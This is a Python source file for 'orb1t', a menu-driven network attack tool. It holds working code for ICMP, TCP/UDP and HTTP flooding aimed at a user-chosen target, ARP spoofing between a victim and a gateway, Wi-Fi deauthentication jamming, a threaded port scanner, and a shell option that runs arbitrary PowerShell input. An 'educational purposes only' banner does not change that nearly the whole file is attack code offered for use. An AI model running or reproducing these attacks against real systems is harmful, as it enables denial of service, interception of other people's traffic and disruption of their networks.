#!/usr/bin/env python3

import os; os.system('mode con: cols=120 lines=30')
import socket
import threading
import time
import logging
from scapy.all import ARP, Ether, send, srp, RadioTap, Dot11, sendp, Dot11Deauth, DNS, DNSRR, IP, UDP, sniff
import random
import signal
from colorama import Fore, Style, init


init(autoreset=True)
logging.basicConfig(filename='port_scanner.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class orb1t:
    def __init__(self):
        self.running = True
        self.lock = threading.Lock()
        self.log_file = "wifi_jammer.log"  
        self.setup_logging()
        self.running = True
        self.requested_domain = None
        self.spoofed_ip = None
        self.ttl = None
        self.packet_count = 0
        self.start_time = None
        self.lock = threading.Lock()
        self.log_file = None
        self.settings = {
            "target": None,
            "port": None,
            "threads": None,
            "duration": 60,
            "payload": "GET / HTTP/1.1\r\nHost: {}\r\n\r\n",
            "protocol": "udp",
            "log": None,
            "rate_limit": 1,
            "randomize_port": False,
            "packet_size": 1024
        }
    
    def port_scan(self):  
        target = input(Fore.YELLOW + "Enter target IP or domain for port scanning: ")
        start_port = int(input(Fore.YELLOW + "Enter start port: "))
        end_port = int(input(Fore.YELLOW + "Enter end port: "))

        print(Fore.GREEN + f"Scanning ports from {start_port} to {end_port} on {target}...")
   
        open_ports = []
        closed_ports = []
    
    
    

        def scan_port(port):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)  
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    print(Fore.GREEN + f"Port {port} is open.")
                else:
                    closed_ports.append(port)
                    print(Fore.RED + f"Port {port} is closed.")
                    
        threads = []
        

        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()

    
        for thread in threads:
            thread.join()

      
        results_file = "port_scan_results.txt"
        with open(results_file, 'w') as f:
            f.write(f"Port scan results for {target} from {start_port} to {end_port}:\n")
            f.write("Open Ports:\n")
            for port in open_ports:
                f.write(f"{port}\n")
            f.write("Closed Ports:\n")
            for port in closed_ports:
                f.write(f"{port}\n")

        print(Fore.GREEN + f"Port scan completed. Results saved to {results_file}.")
        logging.info(f"Port scan completed for {target}. Results saved to {results_file}.")


       
        signal.signal(signal.SIGINT, self.signal_handler)

    def run_powershell_command(self):
        command = input(Fore.YELLOW + "Enter the PowerShell command to run: ")
        
        result = os.popen(f'powershell.exe {command}').read()
        print(result)  
        input(Fore.YELLOW + "Press Enter to return to the menu...")

    

    def setup_logging(self):
        logging.basicConfig(filename=self.log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    def signal_handler(self, sig, frame):
        print(Fore.RED + "\nStopping all threads...")
        self.running = False
        exit(0)

    def enable_monitor_mode(self, interface):
        os.system(f"airmon-ng start {interface}")
        print(f"{interface} is now in monitor mode.")
        logging.info(f"Enabled monitor mode on {interface}.")

    def disable_monitor_mode(self, interface):
        os.system(f"airmon-ng stop {interface}")
        print(f"{interface} is now back in managed mode.")
        logging.info(f"Disabled monitor mode on {interface}.")

    def send_deauth(self, target_mac, gateway_mac, interface, packet_count=100, delay=0.1):
        print(f"Sending deauthentication packets to {target_mac} from {gateway_mac}")
        
 
        deauth_packet = RadioTap() / \
                        Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / \
                        Dot11Deauth(reason=7)

    
        for _ in range(packet_count):
            if not self.running:
                break
            sendp(deauth_packet, iface=interface, verbose=False)
            time.sleep(delay)

    def wifi_jammer(self):
        target_mac = input(Fore.YELLOW + "Enter target MAC address (to jam): ")
        gateway_mac = input(Fore.YELLOW + "Enter gateway MAC address: ")
        interface = input(Fore.YELLOW + "Enter your network interface (e.g., wlan0): ")
        packet_count = int(input(Fore.YELLOW + "Enter number of packets to send (default 100): ") or 100)
        delay = float(input(Fore.YELLOW + "Enter delay between packets (default 0.1s): ") or 0.1)

        if not self.validate_interface(interface):
            print(Fore.RED + "Invalid network interface. Please try again.")
            return

       
        self.enable_monitor_mode(interface)

        try:
            print(Fore.GREEN + f"Starting Wi-Fi Jammer on {interface}...")
            print(Fore.YELLOW + f"Sending deauthentication packets to {target_mac} from {gateway_mac}...")

        
            deauth_thread = threading.Thread(target=self.send_deauth, args=(target_mac, gateway_mac, interface, packet_count, delay))
            deauth_thread.start()

            deauth_thread.join()  
            print(Fore.GREEN + f"Finished sending {packet_count} deauthentication packets to {target_mac}.")
        except Exception as e:
            logging.error(f"Wi-Fi Jammer Error: {e}")
            print(Fore.RED + f"Wi-Fi Jammer Error: {e}")
        finally:

            self.disable_monitor_mode(interface)

    def validate_interface(self, interface):
        interfaces = os.popen("iw dev").read()
        if interface in interfaces:
            return True
        return False
    


    def print_header(self):
        print(Fore.LIGHTBLUE_EX + r"""                                                                                                                                                                                         
           
BY USING THIS SCRIPT, YOU AGREE TO TAKE FULL RESPONSIBILITY 
FOR ANY DAMAGE CAUSED BY ORB1T.
THIS SCRIPT, WAS MADE FOR EDUCATIONAL AND TESTING
PURPOSES ONLY.            
 ________  ________  ________    _____  _________   
|\   __  \|\   __  \|\   __  \  / __  \|\___   ___\ 
\ \  \|\  \ \  \|\  \ \  \|\ /_|\/_|\  \|___ \  \_| 
 \ \  \\\  \ \   _  _\ \   __  \|/ \ \  \   \ \  \  
  \ \  \\\  \ \  \\  \\ \  \|\  \   \ \  \   \ \  \ 
   \ \_______\ \__\\ _\\ \_______\   \ \__\   \ \__\
    \|_______|\|__|\|__|\|_______|    \|__|    \|__| v1.2
""")
    
    def print_space(self):
        print(Fore.YELLOW + "|                                                        |")

    def main_menu(self):
        while True:
            self.print_header()  
            print(Fore.YELLOW + " -------------------COMMAND-MENU------------------------")
            self.print_space()
            print(Fore.YELLOW + "|-- help                 view the command menu --     2  |")
            print(Fore.YELLOW + "|-- clr                  Clear the screen      --     3  |")
            print(Fore.YELLOW + "|-- shell                run a shell command   --     4  |")
            print(Fore.YELLOW + "|-- exit,q               exits the script      --     4  |")
            self.print_space()
            print(Fore.YELLOW + "|------------------------------------------------------- |")
            self.print_space()
            print(Fore.YELLOW + "|-- l3                   layer 3 (ICMP)        --     5  |")
            print(Fore.YELLOW + "|-- l4                   Layer 4 (TCP / UDP)   --     6  |")
            print(Fore.YELLOW + "|-- l7                   Layer 7 (HTTP)        --     7  |")
            print(Fore.YELLOW + "|-- port                 perform a port scan   --    10  |")
            print(Fore.YELLOW + "|-- arp                  arp spoofer           --    11  |")
            print(Fore.YELLOW + "|-- jam                  wifi jammer/deauth    --    12  |")
            self.print_space()
            print(Fore.YELLOW + " -------------------------------------------------------")
    
            choice = input(Fore.YELLOW + ">>>").lower()
            if choice in ['exit', 'q']:
                print(Fore.RED + "goodbye and thanks for using orb1t...")
                os._exit(0)
            elif choice == 'clr':
                os.system('clr' if os.name == 'posix' else 'cls')
            elif choice == 'arp':
                self.interactive_arp_spoofing()
            elif choice.startswith('l'):
                self.load_module(choice)
            elif choice == 'jam':
                self.wifi_jammer()
            elif choice == 'shell':
                self.run_powershell_command()
            elif choice == 'port':
                self.port_scan()   
            else:
                print(Fore.RED + "Invalid command. Please try again.")


    def load_module(self, command):
        if command == 'l3':
            self.interactive_layer3()
        elif command == 'l4':
            self.interactive_layer4()
        elif command == 'l7':
            self.interactive_layer7()

    def interactive_layer3(self):
        self.settings["target"] = input(Fore.YELLOW + "Enter target IP: ")
        self.settings["threads"] = int(input(Fore.YELLOW + "Enter number of threads: "))
        self.settings["duration"] = int(input(Fore.YELLOW + "Enter attack duration in seconds (default 60): ") or 60)

        print(Fore.GREEN + "\nConfiguration complete! Starting ICMP scan...")
        self.start_time = time.time()
        for _ in range(self.settings["threads"]):
            threading.Thread(target=self.send_icmp_packets, args=(self.settings["target"],)).start()

    def interactive_layer4(self):
        self.settings["target"] = input(Fore.YELLOW + "Enter target IP: ")
        self.settings["port"] = int(input(Fore.YELLOW + "Enter target port: "))
        self.settings["threads"] = int(input(Fore.YELLOW + "Enter number of threads: "))
        self.settings["duration"] = int(input(Fore.YELLOW + "Enter attack duration in seconds (default 60): ") or 60)
        self.settings["protocol"] = input(Fore.YELLOW + "Enter protocol (udp/tcp, default: udp): ") or "udp"
        self.settings["randomize_port"] = input(Fore.YELLOW + "Randomize port for each packet? (y/n, default: n): ").lower() == 'y'
        self.settings["packet_size"] = int(input(Fore.YELLOW + "Enter packet size in bytes (default: 1024): ") or 1024)

        print(Fore.GREEN + "\nConfiguration complete! Starting Layer 4 attack...")
        self.start_time = time.time()
        for _ in range(self.settings["threads"]):
            threading.Thread(target=self.send_packets, args=(self.settings["target"],)).start()

    def interactive_layer7(self):
        self.settings["target"] = input(Fore.YELLOW + "Enter target IP or domain: ")
        self.settings["port"] = int(input(Fore.YELLOW + "Enter target port: "))
        self.settings["threads"] = int(input(Fore.YELLOW + "Enter number of threads: "))
        self.settings["duration"] = int(input(Fore.YELLOW + "Enter attack duration in seconds (default 60): ") or 60)

        print(Fore.GREEN + "\nConfiguration complete! Starting Layer 7 attack...")
        self.start_time = time.time()
        payload = self.settings["payload"].format(self.settings["target"])
        for _ in range(self.settings["threads"]):
            threading.Thread(target=self.send_http_requests, args=(self.settings["target"], payload)).start()

    

    def send_icmp_packets(self, target_ip):
     while self.running:
        try:
            packet = self.generate_icmp_packet()
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
                sock.sendto(packet, (target_ip, 0))
                with self.lock:
                    self.packet_count += 1
                self.log(Fore.MAGENTA + f"Sent ICMP packet to {target_ip}")
            self.report_packets()
        except Exception as e:
            self.log(Fore.RED + f"ICMP Error: {e}")

      
    def generate_icmp_packet(self):
        return b'\x08\x00\x00\x00'
    
    def send_packets(self, target_ip):
        protocol = self.settings["protocol"].lower()
        start_time = time.time()  

        while self.running:
            try:
                if protocol == "udp":
                    packet = self.generate_payload()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    port = self.settings["port"] if not self.settings["randomize_port"] else random.randint(1, 65535)
                    sock.sendto(packet, (target_ip, port))
                    
                    with self.lock:
                        self.packet_count += 1
                    self.log(Fore.MAGENTA + f"Sent UDP packet to {target_ip}:{port}")
                    
                elif protocol == "tcp":
                    packet = self.generate_payload()
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.connect((target_ip, self.settings["port"]))
                        sock.sendall(packet)
                        
                        with self.lock:
                            self.packet_count += 1
                        self.log(Fore.MAGENTA + f"Sent TCP packet to {target_ip}:{self.settings['port']}")
                        
                self.report_packets()  

            except Exception as e:
                self.log(Fore.RED + f"TCP/UDP Error: {e}")

        end_time = time.time()
        total_duration = end_time - start_time
        self.log(Fore.GREEN + f"Attack completed. Sent {self.packet_count} packets in {total_duration:.2f} seconds.")
    
    def stop_attack(self):
        self.running = False
        self.log(Fore.GREEN + "Attack stopped by user.")

    def report_packets(self):
        self.log(Fore.CYAN + f"Packets sent so far: {self.packet_count}")

    def generate_payload(self):
        return b'X' * self.settings["packet_size"]

    def report_packets(self):
        elapsed_time = time.time() - self.start_time
        if elapsed_time >= self.settings["duration"]:
            print(Fore.YELLOW + f"\nTotal packets sent: {self.packet_count}")
            self.running = False

    def log(self, message):
        print(message)
        if self.settings["log"]:
            logging.info(message)



    def scan(self, command):
        if command == "scnip":
            self.scan_ip()
        elif command == "scndomain":
            self.scan_domain()
        else:
            print(Fore.RED + "Invalid scan command.")


    def scan_ip(self):
        ip = input(Fore.YELLOW + "Enter IP address to ping: ")
        print(Fore.GREEN + f"Pinging IP {ip}...")
        response = os.system(f"ping -c 1 {ip}")
        if response == 0:
            print(Fore.GREEN + f"IP {ip} is reachable.")
        else:
            print(Fore.RED + f"IP {ip} is not reachable.")

    def scan_domain(self):
        domain = input(Fore.YELLOW + "Enter domain to scan: ")
        try:
            ip = socket.gethostbyname(domain)
            print(Fore.GREEN + f"The domain {domain} resolves to IP: {ip}")
        except socket.gaierror:
            print(Fore.RED + f"Could not resolve domain {domain}.")

    

    def interactive_arp_spoofing(self):
        target_ip = input(Fore.YELLOW + "Enter target IP address: ")
        gateway_ip = input(Fore.YELLOW + "Enter gateway IP address: ")
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        if target_mac is None or gateway_mac is None:
            print(Fore.RED + "Could not retrieve MAC addresses. Please check the IPs and try again.")
            return

        print(Fore.GREEN + f"Starting ARP spoofing on target {target_ip} (MAC: {target_mac}) and gateway {gateway_ip} (MAC: {gateway_mac})...")
        
        self.send_arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac)

    def get_mac(self, ip_address):
        try:
            arp_request = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=1, verbose=False)[0]
            for sent, received in arp_request:
                return received.hwsrc
        except Exception as e:
            print(Fore.RED + f"Error retrieving MAC for {ip_address}: {e}")
            return None

    def send_arp_spoof(self, target_ip, gateway_ip, target_mac, gateway_mac):
        try:
            while self.running:

                send(ARP(op=ARP.is_at, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac), verbose=False)
                send(ARP(op=ARP.is_at, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac), verbose=False)
                time.sleep(2)  
        except Exception as e:
            print(Fore.RED + f"Error during ARP spoofing: {e}")

    def send_http_requests(self, target_ip, payload):

     user_agents_file = 'src/user-agents.txt'
     user_agents = []


     if os.path.exists(user_agents_file):
         with open(user_agents_file, 'r') as file:
            user_agents = [line.strip() for line in file if line.strip()]
     else:
        self.log(Fore.RED + "User-Agent file not found. Default User-Agents will be used.")

     while self.running:
        try:
    
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target_ip, self.settings["port"]))
                
  
                user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"

                headers = {
                    "User-Agent": user_agent,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "keep-alive",
                }

            
                request = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\n" + \
                          ''.join(f"{key}: {value}\r\n" for key, value in headers.items()) + \
                          f"Content-Length: {len(payload)}\r\n\r\n{payload}"

       
                sock.sendall(request.encode())
                
                with self.lock:
                    self.packet_count += 1
                self.log(Fore.MAGENTA + f"Sent HTTP request to {target_ip}:{self.settings['port']}")
            self.report_packets()
            time.sleep(self.settings["rate_limit"])
        except Exception as e:
            self.log(Fore.RED + f"HTTP Error: {e}")

if __name__ == "__main__":
    tool = orb1t()
    tool.main_menu()
    orb1t_instance = orb1t()  
    orb1t_instance.port_scan()